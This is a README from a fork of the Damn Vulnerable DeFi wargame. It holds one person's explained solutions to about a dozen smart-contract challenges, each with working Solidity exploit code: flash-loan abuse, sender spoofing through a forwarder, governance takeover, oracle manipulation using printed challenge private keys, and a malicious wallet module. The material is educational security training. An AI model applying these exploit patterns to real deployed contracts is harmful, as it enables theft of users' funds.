# TODO:
- differencies between different uniswaps for puppets
- add codes


forge test --mp test/curvy-puppet/CurvyPuppet.t.sol && \

forge test --mp test/abi-smuggling/ABISmuggling.t.sol && \
forge test --mp test/backdoor/Backdoor.t.sol && \
forge test --mp test/climber/Climber.t.sol && \
forge test --mp test/compromised/Compromised.t.sol && \
forge test --mp test/free-rider/FreeRider.t.sol && \
forge test --mp test/naive-receiver/NaiveReceiver.t.sol && \
forge test --mp test/puppet/Puppet.t.sol && \
forge test --mp test/puppet-v2/PuppetV2.t.sol && \
forge test --mp test/puppet-v3/PuppetV3.t.sol && \
forge test --mp test/selfie/Selfie.t.sol && \
forge test --mp test/shards/Shards.t.sol && \
forge test --mp test/side-entrance/SideEntrance.t.sol && \
forge test --mp test/the-rewarder/TheRewarder.t.sol && \
forge test --mp test/truster/Truster.t.sol && \
forge test --mp test/unstoppable/Unstoppable.t.sol && \
forge test --mp test/wallet-mining/WalletMining.t.sol && \
forge test --mp test/withdrawal/Withdrawal.t.sol

# Hello, It's a fork of the Damn Vulnerable DeFi
## My solutions:

### Unstoppable

#### Task: 

There's a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There's a monitoring contract to check liveness of the flashloan feature.

Starting with 10 DVT tokens in balance, show that it's possible to halt the vault. It must stop offering flash loans.

#### Solution Explanation:

From the task description, we need to identify a condition in the *flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)* function that we can manipulate to force a revert.

The key weakness lies in this check:

```if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();```

Here shares represent the ownership interest of a depositor in the vault. When someone deposits tokens into the vault, they receive shares in return. 

This condition exists to ensure the correct balance of shares in the vault. By breaking the logic behind shares and assets, we can trigger this revert condition.

To exploit this, the solution is to disrupt the vault’s accounting by transferring tokens (which we have at the start) directly to the vault’s address, thereby causing the balance mismatch.


<details>
  <summary> Code </summary>

  ```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
}
  ```
</details>


---
### Naive receiver

#### Task: 

There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

#### Solution Explanation:

What we have:

The set of smart contracts implements a flash loan pool using WETH. The pool allows users to take flash loans with a fixed fee of 1WETH, perform multiple calls within a single transaction (multicall), and manage deposits in WETH.

Key Contracts:

1.	BasicForwarder: A contract that facilitates transaction forwarding. It verifies and executes signed transactions on behalf of users.

2.	FlashLoanReceiver: A contract implementing the IERC3156FlashBorrower interface, allowing it to receive flash loans. It ensures the loan is repaid with the correct fee and performs actions during the flash loan.

3.	Multicall: Allows multiple function calls to be batched into a single transaction.

4.	NaiveReceiverPool: The core flash loan pool contract. It manages deposits in WETH and provides flash loans with a fixed fee. Users can deposit, withdraw, and borrow through this contract.


The task can be split into two main objectives:

1.	Draining the User’s Contract Using Flash Loans:
Our first objective is to perform 10 flash loan calls using the function:

```solidity
flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
```

This will allow us to transfer the user’s entire WETH balance (10 WETH) to the fee receiver (which is set to the deployer). To facilitate this, we’ll encode the flash loan call and utilize the pool’s multicall(bytes[] calldata data) function, enabling us to make multiple calls within a single transaction.


2.	Exploiting the Withdrawal Mechanism to Drain the Pool:

The next step involves leveraging the withdraw(uint256 amount, address payable receiver) function in the pool contract:

```solidity
function withdraw(uint256 amount, address payable receiver) external {
    deposits[_msgSender()] -= amount;
    totalDeposits -= amount;
    weth.transfer(receiver, amount);
}
```

The key vulnerability here is that this function lacks any significant access control checks. The msg.sender is determined by this function:

```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```

When the trustedForwarder is used, the pool interprets the last 20 bytes of the transaction data as the address of the caller. By encoding the function call to withdraw and appending the deployer’s address as the last 20 bytes, we can trick the pool into thinking the deployer initiated the withdrawal.

But there is a small problem in the execute function in the forwarder which appends the from address to the payload:


```solidity 
bytes memory payload = abi.encodePacked(request.data, request.from);
```

We can avoid this extra check by wrapping the payload in a call to multicall, which will prevent the pool from appending the deployer’s address again, thus allowing us to successfully withdraw the funds.



<details>
  <summary> Code </summary>

  ```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes memory flashLoanCallData = abi.encodeWithSignature(
        "flashLoan(address,address,uint256,bytes)",
            address(receiver),
            address(weth),
            WETH_IN_RECEIVER,
            bytes("")
        );
    bytes[] memory dataArray = new bytes[](10);
    for (uint256 i = 0; i < 10; i++) {
        dataArray[i] = flashLoanCallData;
    }
    pool.multicall(dataArray);  
 
 
    bytes memory WithdrawCallData = abi.encodeWithSignature(
            "withdraw(uint256,address)",
            WETH_IN_POOL + WETH_IN_RECEIVER,
            recovery
    );  
    bytes memory deployerBytes = abi.encodePacked(deployer);
    WithdrawCallData = abi.encodePacked(WithdrawCallData, deployerBytes);

    bytes[] memory dataArray2 = new bytes[](1);
    dataArray2[0] = WithdrawCallData;

    bytes memory MulticallWithdrawCallData = abi.encodeWithSignature(
            "multicall(bytes[])",
            dataArray2
    );    
  
    BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 30000000,
            nonce: forwarder.nonces(player),
            data: MulticallWithdrawCallData,
            deadline: block.timestamp + 10 hours
        });
    bytes32 msgHash = forwarder.getDataHash(request);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, keccak256(abi.encodePacked("\x19\x01",  forwarder.domainSeparator(), msgHash)));
    bytes memory signature = abi.encodePacked(r, s, v);
    assertEq(signature.length, 65);        
    forwarder.execute(request, signature);        
}
```
</details>

---
### Truster

#### Task: 

More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

#### Solution Explanation:

The pool allows us to request a flash loan via the function:

``` solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
```

This function transfers tokens to the borrower and then executes an arbitrary call on the target address, passing the data as a parameter. The vulnerability here lies in the lack of restrictions on what kind of operation can be executed in the target. This means we can use the pool’s own token contract as the target and have it perform an approval operation on our behalf.


By setting the target to the DVT token contract and sending a flash loan request for 0 tokens, we can encode a call to the token’s approve function in the data field, giving ourselves permission to transfer the pool’s tokens.

Once the flash loan is executed, we will have permission to withdraw all 1 million DVT tokens from the pool. We can then immediately transfer these tokens to the recovery account.

```
uint256 poolBalance = token.balanceOf(address(pool)); 
pool.flashLoan(
    0, 
    address(this), 
    address(token), 
    abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance)
);
token.transferFrom(address(pool), recoveryAddress, poolBalance);
```


<details>
  <summary> Code </summary>

  ```solidity
contract Target {
    using Address for address;

    constructor(DamnValuableToken _token, TrusterLenderPool _pool, address _recovery) {
        uint256 b = _token.balanceOf(address(_pool)); 
        _pool.flashLoan(0, address(this), address(_token), abi.encodeWithSignature("approve(address,uint256)", address(this), b));
        _token.transferFrom(address(_pool), _recovery, b);
    }
}


function test_truster() public checkSolvedByPlayer {
    new Target(token, pool, recovery);
}

  ```
</details>

---
### Side Entrance

#### Task: 

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.

Yoy start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

#### Solution Explanation:

What we have:

The pool’s contract provides the following key functions:

- deposit(): Allows users to deposit ETH, which is tracked in a balance mapping.
- withdraw(): Lets users withdraw their deposited ETH.
- flashLoan(): Provides a flash loan to any caller, with the requirement that the loan must be repaid within the same transaction.

The problem is in the fact that we can use flash loans to deposit the funds into the pool using the deposit() function. Since the deposit() increases our balance in the pool, we fulfill the condition without ever actually sending our ETH to the pool.

After the flash loan transaction completes, the pool believes we’ve “repaid” the loan (even though the ETH was just deposited). Now we can simply withdraw our deposited balance from the pool.

Finally, we transfer all the ETH to the recovery address, completing the attack.

<details>
  <summary> Code </summary>

  ```solidity

contract Attack {
    SideEntranceLenderPool pool;
    error RepayFailed();

    receive() external payable {}

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function loan(uint256 amount) public {
        pool.flashLoan(amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw(address recovery) external payable {
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, address(this).balance);
    }
}



function test_sideEntrance() public checkSolvedByPlayer {
    Attack attack = new Attack(pool);
    attack.loan(ETHER_IN_POOL);
    attack.withdraw(recovery);
}
  ```
</details>

---
###  The Rewarder

#### Task: 

A contract is distributing rewards of Damn Valuable Tokens and WETH.

To claim rewards, users must prove they're included in the chosen set of beneficiaries. Don't worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.

Alice has claimed her rewards already. You can claim yours too! But you've realized there's a critical vulnerability in the contract.

Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.

#### Solution Explanation:

The contract allows users to claim rewards based on their inclusion in a set of beneficiaries. These beneficiaries are verified through Merkle proofs. Each user can submit multiple claims in a single transaction for different tokens (such as DVT and WETH).

The critical part of the claim process lies in the claimRewards() function, which updates the claimed status of tokens for users through bit manipulation in a mapping.

The contract does not immediately track which token is being processed, allowing the _setClaimed() function to only execute for the last claim in a batch. This means we can claim rewards without properly updating the state for previous claims.

```solidity
    function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
        Claim memory inputClaim;
        IERC20 token;
        ...
        for (uint256 i = 0; i < inputClaims.length; i++) {
  
            if (token != inputTokens[inputClaim.tokenIndex]) {

                THIS PART WAS SKIPPED EACH TIME BEFORE THE LAST CLAIM

                if (address(token) != address(0)) {
                    if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
                }
                token = inputTokens[inputClaim.tokenIndex];
                ...
            } else {
                bitsSet = bitsSet | 1 << bitPosition;
                amount += inputClaim.amount;
            }
            if (i == inputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }
            ...
        }
    }

```

By carefully crafting claims and leveraging this oversight in the claimRewards() function, we can claim rewards multiple times for DVT and WETH, without the contract realizing it.

We submit multiple claims for both DVT and WETH, exploiting the mismanagement of token state. This allows us to drain the contract’s funds. After claiming all available rewards, we transfer them to the recovery account.


<details>
  <summary> Code </summary>

  ```solidity
function test_theRewarder() public checkSolvedByPlayer {
    // dvt ind 188
    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    uint limitDVT = 867;
    uint limitWETH = 853;
    Claim[] memory claims = new Claim[](limitDVT);
    IERC20[] memory tokensToClaim = new IERC20[](limitDVT);

    for(uint i = 0; i < limitDVT; i++){
        claims[i] = Claim({
            batchNumber: 0, 
            amount: 11524763827831882,
            tokenIndex: 0, 
            proof: merkle.getProof(dvtLeaves, 188) 
        });
        tokensToClaim[i] = IERC20(address(dvt));
    }
    distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

    Claim[] memory claims2 = new Claim[](limitWETH);
    IERC20[] memory tokensToClaim2 = new IERC20[](limitWETH);
    for(uint i = 0; i < limitWETH; i++){
        claims2[i] = Claim({
            batchNumber: 0, 
            amount: 1171088749244340,
            tokenIndex: 1, 
            proof: merkle.getProof(wethLeaves, 188)
        });
        tokensToClaim2[i] = IERC20(address(weth));
    }
    distributor.claimRewards({inputClaims: claims2, inputTokens: tokensToClaim2});
    weth.transfer(recovery, weth.balanceOf(player));
    dvt.transfer(recovery, dvt.balanceOf(player));
}
  ```
</details>

---
###  Selfie

#### Task: 

A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million at risk.

Rescue all funds from the pool and deposit them into the designated recovery account.

#### Solution Explanation:

The lending pool uses a governance model that allows any entity holding more than half of the total DVT supply to propose and execute actions after a delay. A flash loan enables us to temporarily borrow a large number of tokens, which can be used to influence the governance and propose actions, like withdrawing all funds abusing the system’s delay mechanism.


So the strategy is to take a flash loan from the pool for the maximum available DVT token -> to delegate the borrowed tokens to gain voting power -> using this voting power to propose an emergency exit action that transfers all funds to the recovery account -> wait for the governance action delay to pass, and execute the emergency exit, transferring all funds to the recovery account.

```solidity

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        DVT.delegate(address(this));
        governance.queueAction(address(pool), 0, data);
        DVT.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function test_selfie() public checkSolvedByPlayer {
        FlashLoanReceiver reciever = new FlashLoanReceiver(pool, token, governance);
        bytes memory EmergencyExitCallData = abi.encodeWithSignature(
            "emergencyExit(address)", 
            recovery
        );    
        pool.flashLoan(reciever, address(token), TOKENS_IN_POOL, EmergencyExitCallData);

        vm.warp(block.timestamp + 3 days);
        governance.executeAction(1); 
    }

```


<details>
  <summary> Code </summary>

  ```solidity

contract FlashLoanReceiver is IERC3156FlashBorrower {
    SelfiePool private pool;
    DamnValuableVotes private DVT;
    SimpleGovernance private governance;

    constructor(SelfiePool _pool, DamnValuableVotes _token, SimpleGovernance _governance) {
        pool = _pool;
        DVT = _token;
        governance = _governance;
    }

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        DVT.delegate(address(this));
        governance.queueAction(address(pool), 0, data);
        DVT.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function _executeActionDuringFlashLoan() internal {}
}

function test_selfie() public checkSolvedByPlayer {
    FlashLoanReceiver reciever = new FlashLoanReceiver(pool, token, governance);
    bytes memory EmergencyExitCallData = abi.encodeWithSignature(
            "emergencyExit(address)", 
            recovery
    );    
    pool.flashLoan(reciever, address(token), TOKENS_IN_POOL, EmergencyExitCallData);

    vm.warp(block.timestamp + 3 days);
    governance.executeAction(1); 
}


  ```
</details>

---
###  Compromised

#### Task: 

While poking around a web service of one of the most popular DeFi projects in the space, you get a strange response from the server. Here’s a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```

A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.

This price is fetched from an on-chain oracle, based on 3 trusted reporters: `0x188...088`, `0xA41...9D8` and `0xab3...a40`.

Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.


#### Solution Explanation:

The key to this challenge lies in the oracle being compromised. By manipulating two of the three trusted oracle sources, we can artificially lower the price of the DVNFT token, allowing us to buy one for virtually zero cost. Then, after resetting the price back to its original value, we can sell the token at the original high price and drain the funds from the exchange.

1.	Decode the oracle addresses (hex+base64): Using the hex code provided in the response, decode it to find the addresses of the trusted oracles.

2.	Manipulate the price: Use the oracle to set the price of the DVNFT to 0 from the compromised addresses.

3.	Buy a DVNFT: Purchase a DVNFT for 0 ETH since the price was manipulated.

4.	Restore the price: Reset the price of the DVNFT back to the original 999 ETH.

5.	Sell the DVNFT: Sell the DVNFT at the inflated price, draining the exchange’s balance.

6.	Transfer the ETH: Finally, send all the ETH from the sale to the designated recovery address.


<details>
  <summary> Code </summary>

  ```solidity
function test_compromised() public checkSolved {
    //Priv. key: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
    address adr1 = 0x188Ea627E3531Db590e6f1D71ED83628d1933088; // 1 oracle
    //Priv. key: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
    address adr2 = 0xA417D473c40a4d42BAd35f147c21eEa7973539D8; // 2 oracle 

    vm.startPrank(adr1);
    oracle.postPrice("DVNFT", 0);
    vm.stopPrank();

    vm.startPrank(adr2);
    oracle.postPrice("DVNFT", 0);
    vm.stopPrank();

    vm.startPrank(player);
    uint256 ID = exchange.buyOne{value: 1}();
    vm.stopPrank();

    vm.startPrank(adr1);
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.stopPrank();


    vm.startPrank(adr2);
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.stopPrank();

    vm.startPrank(player);
        
    nft.approve(address(exchange), ID);
    exchange.sellOne(ID);
    recovery.call{value: INITIAL_NFT_PRICE}("");

    vm.stopPrank();
}
```

</details>


---





###  Puppet

#### Task: 

There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.

#### Solution Explanation:

Here we can manipulate the price of DVT on Uniswap V1 by swapping tokens for ETH. This lowers the price of DVT in the pool’s oracle, making it possible to borrow more tokens with a smaller amount of ETH collateral.

The function _computeOraclePrice determines the price of DVT relative to ETH based on the reserves in the Uniswap V1 pair: 

``` solidity
    function _computeOraclePrice() private view returns (uint256) {
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
```

To reduce the price in the oracle, you need to increase the token reserves in the Uniswap pair and reduce the ETH reserves. This makes the price of DVT appear lower to the lending pool’s oracle, allowing you to borrow a large amount of tokens for a smaller ETH deposit.

To aime this we can swap our DVTs on ETH using Uniswap V1, increasing the token reserves and reducing the ETH reserves. This manipulation lowers the DVT price in the pool’s oracle.

With the manipulated low price, we borrow all 100,000 DVT from the lending pool using the minimal amount of ETH as collateral.


<details>
  <summary> Code </summary>

  ```solidity
contract Attack{

    DamnValuableToken immutable token;
    PuppetPool immutable pool;
    IUniswapV1Exchange immutable uniswap;
    address immutable recovery;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;


    constructor(address _token, address _pool, address _uniswap, address _recovery) payable{
        token = DamnValuableToken(_token);
        uniswap = IUniswapV1Exchange(_uniswap);
        pool = PuppetPool(_pool);
        recovery = _recovery;
    }

    receive() external payable {}


    function attack() external payable {
        token.approve(address(uniswap), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswap.tokenToEthTransferInput(PLAYER_INITIAL_TOKEN_BALANCE, 9 ether, block.timestamp + 150, address(this));       
        pool.borrow{value: address(this).balance}(POOL_INITIAL_TOKEN_BALANCE, recovery);
    }
}

function test_puppet() public checkSolvedByPlayer {
    Attack attack = new Attack{value: PLAYER_INITIAL_ETH_BALANCE/2}(address(token), address(lendingPool), address(uniswapV1Exchange), recovery);
    token.transfer(address(attack), PLAYER_INITIAL_TOKEN_BALANCE);
    attack.attack();       
}

  ```
</details>


---

###  Puppet V2

#### Task: 

The developers of the [previous pool](https://damnvulnerabledefi.xyz/challenges/puppet/) seem to have learned the lesson. And released a new version.

Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. Shouldn't that be enough?

You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance at risk!

Save all funds from the pool, depositing them into the designated recovery account.


#### Solution Explanation:

The pool uses a Uniswap v2 price oracle to calculate the required collateral in WETH for borrowing DVT. The borrower must deposit three times the value of the borrowed amount in WETH to the pool.

This price is calculated based on the reserves of WETH and DVT in the Uniswap v2 pair. We can manipulate this price by interacting with the Uniswap v2 liquidity pool.

By swapping DVT tokens for ETH on Uniswap, we can drastically affect the reserves in the Uniswap pair, driving up the cost of DVT relative to ETH. This manipulation allows us to artificially lower the collateral requirement needed to borrow a large amount of DVT from the pool.

Once the price of DVT is sufficiently lowered, we deposit a relatively small amount of WETH to meet the manipulated collateral requirements and borrow all 1 million DVT tokens from the pool. These tokens are then transferred to the recovery address, completing the exploit.


<details>
  <summary> Code </summary>

  ```solidity
    function test_puppetV2() public checkSolvedByPlayer {
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE,  0, path, player, block.timestamp+150);
        uint256 balance = player.balance;
        weth.deposit{value: balance}();
        weth.approve(address(lendingPool), balance);
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }
  ```
</details>

---
###  Free Rider

#### Task:

A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don't know how to save them!

They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract.

You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

If only you could get free ETH, at least for an instant.

#### Solution Explanation:

The FreeRiderNFTMarketplace smart contract has two key vulnerabilities:

1. *Insufficient Payment Check Across Multiple Purchases*: The function buyMany calls _buyOne without verifying the total payment for multiple purchases. As a result, if a user intends to buy all 6 NFTs priced at 15 ETH each (totaling 90 ETH), they need only provide 15 ETH. The contract then deducts the payment for each NFT from its own balance instead of the user’s, allowing us to buy multiple NFTs with minimal ETH upfront.

2. *Ordering of Transfer and Payment in _buyOne*:
Within _buyOne, the NFT transfer occurs before the payment to the token owner. Payment is attempted using the owner’s address, but due to the ordering, we ultimately pay ourselves, resulting in no actual cost for each NFT transferred.

```solidity
function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) revert TokenNotOffered(tokenId);
    if (msg.value < priceToPay) revert InsufficientPayment();

    --offersCount;

    // Transfer NFT from seller to buyer
    DamnValuableNFT _token = token;
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

    // Pay the seller
    payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

    emit NFTBought(msg.sender, tokenId, priceToPay);
}
```

With these vulnerabilities in mind, we only need to leverage uniswapV2Call to obtain 15 ETH for the initial call, allowing us to execute the attack.


<details>
  <summary> Code </summary>

 
```solidity
contract Attack {

    FreeRiderRecoveryManager public immutable recoveryContract;
    FreeRiderNFTMarketplace public immutable marketplace;
    DamnValuableNFT public immutable nft;
    IUniswapV2Pair public immutable pair;
    IWETH public immutable weth;
    address immutable me;

    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(address _pair, address payable _marketplace, address _weth, address _nft, address _recovery, address _me){
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        nft = DamnValuableNFT(_nft);
        weth = IWETH(_weth);
        recoveryContract = FreeRiderRecoveryManager(_recovery);
        me = _me;
    }

    receive() external payable {}

    function attack() external payable {
        pair.swap(15e18, 0, address(this), '0x0');
    }


    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        weth.withdraw(15e18);
        marketplace.buyMany{value: 15e18}(tokenIds);
        weth.deposit{value: 15e18 + 0.05 ether}();
        weth.transfer(address(pair), 15e18 + 0.05 ether);
        for(uint256 i; i < 6; i++){
            nft.safeTransferFrom(address(this), address(recoveryContract), i, abi.encode(me));
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}

function test_freeRider() public checkSolvedByPlayer {
    Attack attack = new Attack(address(uniswapPair), payable(address(marketplace)),address(weth), address(nft), address(recoveryManager), player);
    attack.attack{value: PLAYER_INITIAL_ETH_BALANCE}();
}

```
</details>

---
###  Backdoor

#### Task: 

To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Safe wallets. When someone in the team deploys and registers a wallet, they earn 10 DVT tokens.

The registry tightly integrates with the legitimate Safe Proxy Factory. It includes strict safety checks.

Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

Uncover the vulnerability in the registry, rescue all funds, and deposit them into the designated recovery account. In a single transaction.

#### Solution Explanation:

The Wallet Registry’s 

The Safe's setup allows users to configure a custom “module” within their wallets. And this is not checked in the proxyCreated function of the contract WalletRegistry. By exploiting this, we can introduce a module that can call an approve function on behalf of the beneficiary wallet to authorize token transfers. This enables us to bypass the Registry’s security checks and gain control over the tokens distributed to each beneficiary wallet.

So we create a simple module contract with a function to approve DVT token transfers on behalf of the beneficiary wallet. Than we initiate Wallet Registration with Malicious Callback: For each beneficiary, we deploy a new wallet via createProxyWithCallback, using our module’s approve function in the initializer payload. This function authorizes the attacker to transfer the DVT tokens from the beneficiary wallet to the recovery account Once each beneficiary wallet approves the token transfer, we proceed to withdraw the 10 DVT tokens per beneficiary (totaling 40 DVT tokens) to the designated recovery address.


<details>
  <summary> Code </summary>

 ```solidity
contract Module {
    function approve(address player, IERC20 token, uint256 amount) public {
      token.approve(player, amount);
    }
}


contract Attack {
    IERC20 public immutable token;
    SafeProxyFactory public immutable walletFactory;
    address public immutable registry;
    address public immutable singletonCopy;

    uint256 private constant PAYMENT_AMOUNT = 10e18;

    Module public immutable module;

    constructor(address _token, address _registry, address _singletonCopy, SafeProxyFactory _walletFactory){
        module = new Module();
        walletFactory = _walletFactory;
        token = IERC20(_token);
        registry = _registry;
        singletonCopy = _singletonCopy;
    }
    
    function attack(address[] memory initialBeneficiaries, address player, address recovery) public {
        for(uint256 i=0; i < initialBeneficiaries.length; i++){
            newProxy(initialBeneficiaries[i], recovery);
        }
    }

    function newProxy(address beneficiare, address recovery) internal returns(bytes memory initializer)  {
        address[] memory owners = new address[](1);       
        owners[0] = beneficiare;
        initializer =  abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", 
            owners, 
            1,
            address(module),
            abi.encodeCall(module.approve, (address(this), token, PAYMENT_AMOUNT)),  
            address(0),
            address(0),
            0,
            address(0)
        );
        walletFactory.createProxyWithCallback(
            singletonCopy,
            initializer,
            0,
            IProxyCreationCallback(registry)
        );
        token.transferFrom(WalletRegistry(registry).wallets(beneficiare), recovery, PAYMENT_AMOUNT);
    }
}
```
</details>




---
###  Climber

#### Task: 

There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the [UUPS pattern](https://eips.ethereum.org/EIPS/eip-1822).

The owner of the vault is a timelock contract. It can withdraw a limited amount of tokens every 15 days.

On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.

On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.

You must rescue all tokens from the vault and deposit them into the designated recovery account.

#### Solution Explanation:

The core vulnerability lies within the execute function of the timelock contract:

```solidity
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
    external
    payable
{
    if (targets.length <= MIN_TARGETS) {
        revert InvalidTargetsCount();
    }

    if (targets.length != values.length) {
        revert InvalidValuesCount();
    }

    if (targets.length != dataElements.length) {
        revert InvalidDataElementsCount();
    }

    bytes32 id = getOperationId(targets, values, dataElements, salt);

    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }

    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```

1. The status check for OperationState.ReadyForExecution happens after executing the operations
2. The function have free access. 

Solution Strategy

1.	Status Bypass in execute:
Since execute only checks the OperationState after actions are performed, we can modify statuses during the execution.

2.	Attack Sequence: By exploiting the vulnerabilities in execute, we can initiate the following steps:
    - Set delay to zero using the updateDelay function, enabling immediate execution of scheduled actions.
    - Assign the “Proposer” role to our address to call shedule function later
    - Transfer vault ownership to our address to gain control over its upgrade permissions.
	- Schedule all these operations with schedule().

With a delay of zero, the scheduled actions achieve the ReadyForExecution state instantly, allowing execute fucntion to complete successfully.

3.	Implementation Upgrade and Token Retrieval: After acquiring ownership, we upgrade the vault with a new contract version containing a modified sweepFunds function that allows us to transfer all tokens to the recovery account.


<details>
